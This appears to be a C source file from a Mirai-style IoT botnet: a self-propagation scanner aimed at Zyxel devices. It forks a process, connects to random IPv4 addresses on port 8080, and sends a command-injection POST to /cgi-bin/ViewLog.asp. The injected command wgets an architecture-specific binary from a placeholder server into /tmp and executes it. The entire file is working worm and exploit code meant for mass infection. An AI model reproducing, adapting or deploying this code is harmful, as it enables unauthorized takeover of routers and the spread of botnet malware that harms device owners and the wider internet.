#include "includes.h"
#include "zyxel.h"
#include "rand.h"
#include "util.h"

#ifdef SELFREP

#define ZYXEL_SCANNER_MAX_CONNS 256
#define ZYXEL_SCANNER_PORT 8080

/* Zyxel command injection payload */
static char *zyxel_payload = 
"POST /cgi-bin/ViewLog.asp HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Type: application/x-www-form-urlencoded\r\n"
"Content-Length: %d\r\n"
"Connection: close\r\n\r\n"
"%s";

static char *zyxel_post_data = 
"start_time=123456&end_time=123457&";

struct zyxel_conn {
    int fd;
    ipv4_t dst_addr;
    time_t last_recv;
};

static struct zyxel_conn conns[ZYXEL_SCANNER_MAX_CONNS];

static ipv4_t get_random_ip_zyxel(void);
static void zyxel_connect(struct zyxel_conn *);
static void zyxel_close(struct zyxel_conn *);

void zyxel_scanner_init(void) {
    if (fork() == 0) {
        int i;
        
        for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
            conns[i].fd = -1;
        }
        
        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            
            FD_ZERO(&fdset);
            
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }
            
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            
            select(maxfd + 1, &fdset, NULL, NULL, &tv);
            
            time_t now = time(NULL);
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && now - conns[i].last_recv > 10) {
                    zyxel_close(&conns[i]);
                }
            }
            
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fdset)) {
                    char buf[4096];
                    int n = recv(conns[i].fd, buf, sizeof(buf), 0);
                    if (n <= 0) {
                        zyxel_close(&conns[i]);
                    } else {
                        conns[i].last_recv = now;
                        zyxel_close(&conns[i]);
                    }
                }
            }
            
            for (i = 0; i < ZYXEL_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd == -1) {
                    conns[i].dst_addr = get_random_ip_zyxel();
                    zyxel_connect(&conns[i]);
                    break;
                }
            }
            
            sleep(1);
        }
    }
}

static ipv4_t get_random_ip_zyxel(void) {
    ipv4_t addr;

    while (TRUE) {
        addr = rand_next();

        /* Target European, Asian, and Latin American ranges where Zyxel is common */
        uint8_t first_octet = (addr >> 24) & 0xFF;

        /* Europe, Asia, Latin America, and Middle East ranges */
        if (first_octet == 31 || first_octet == 37 || first_octet == 41 ||    /* Europe/Africa */
            first_octet == 42 || first_octet == 43 || first_octet == 44 ||    /* Asia */
            first_octet == 45 || first_octet == 46 || first_octet == 47 ||    /* Asia/Europe */
            first_octet == 48 || first_octet == 49 || first_octet == 50 ||    /* Europe/Middle East */
            first_octet == 51 || first_octet == 52 || first_octet == 53 ||    /* Europe */
            first_octet == 54 || first_octet == 55 || first_octet == 56 ||    /* Europe */
            first_octet == 57 || first_octet == 58 || first_octet == 59 ||    /* Europe/Asia */
            first_octet == 60 || first_octet == 61 || first_octet == 62 ||    /* Asia/Europe */
            first_octet == 63 || first_octet == 64 || first_octet == 65 ||    /* Europe/US */
            first_octet == 66 || first_octet == 67 || first_octet == 68 ||    /* US */
            first_octet == 69 || first_octet == 70 || first_octet == 71 ||    /* US */
            first_octet == 72 || first_octet == 73 || first_octet == 74 ||    /* US */
            first_octet == 75 || first_octet == 76 || first_octet == 77 ||    /* US/Europe */
            first_octet == 78 || first_octet == 79 || first_octet == 80 ||    /* Europe/Asia */
            first_octet == 81 || first_octet == 82 || first_octet == 83 ||    /* Europe */
            first_octet == 84 || first_octet == 85 || first_octet == 86 ||    /* Europe */
            first_octet == 87 || first_octet == 88 || first_octet == 89 ||    /* Europe */
            first_octet == 90 || first_octet == 91 || first_octet == 92 ||    /* Europe */
            first_octet == 93 || first_octet == 94 || first_octet == 95 ||    /* Europe/Middle East */
            first_octet == 103 || first_octet == 104 || first_octet == 105 || /* Asia/Africa */
            first_octet == 106 || first_octet == 107 || first_octet == 108 || /* Asia/LatAm */
            first_octet == 109 || first_octet == 110 || first_octet == 111 || /* Asia */
            first_octet == 175 || first_octet == 176 || first_octet == 177 || /* Asia/LatAm */
            first_octet == 178 || first_octet == 179 || first_octet == 180 || /* Asia/Middle East */
            first_octet == 181 || first_octet == 182 || first_octet == 183 || /* Asia */
            first_octet == 184 || first_octet == 185 || first_octet == 186 || /* LatAm/Middle East */
            first_octet == 187 || first_octet == 188 || first_octet == 189 || /* LatAm/Asia */
            first_octet == 190 || first_octet == 191 || first_octet == 192 || /* LatAm */
            first_octet == 193 || first_octet == 194 || first_octet == 195 || /* Europe/Africa */
            first_octet == 196 || first_octet == 197 || first_octet == 198 || /* Africa */
            first_octet == 199 || first_octet == 200 || first_octet == 201 || /* US/LatAm */
            first_octet == 202 || first_octet == 203 || first_octet == 210 || /* Asia */
            first_octet == 211 || first_octet == 212 || first_octet == 213 || /* Asia/Europe */
            first_octet == 217 || first_octet == 218 || first_octet == 219 || /* Europe/Asia */
            first_octet == 220 || first_octet == 221 || first_octet == 222 || /* Asia */
            first_octet == 223) {                                             /* Asia */
            break;
        }
    }

    return addr;
}

static void zyxel_connect(struct zyxel_conn *conn) {
    struct sockaddr_in addr;
    
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;
    
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(ZYXEL_SCANNER_PORT);
    
    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == 0 || errno == EINPROGRESS) {
        char host[32];
        snprintf(host, sizeof(host), "%d.%d.%d.%d",
            (conn->dst_addr >> 24) & 0xFF,
            (conn->dst_addr >> 16) & 0xFF,
            (conn->dst_addr >> 8) & 0xFF,
            conn->dst_addr & 0xFF);
        
        char post[512];
        snprintf(post, sizeof(post), "%swget http://HTTP_SERVER/bins/axis.$(uname -m) -O /tmp/z;sh /tmp/z", zyxel_post_data);
        
        char payload[1024];
        snprintf(payload, sizeof(payload), zyxel_payload, host, util_strlen(post), post);
        
        send(conn->fd, payload, util_strlen(payload), 0);
        conn->last_recv = time(NULL);
    } else {
        close(conn->fd);
        conn->fd = -1;
    }
}

static void zyxel_close(struct zyxel_conn *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
}

#endif
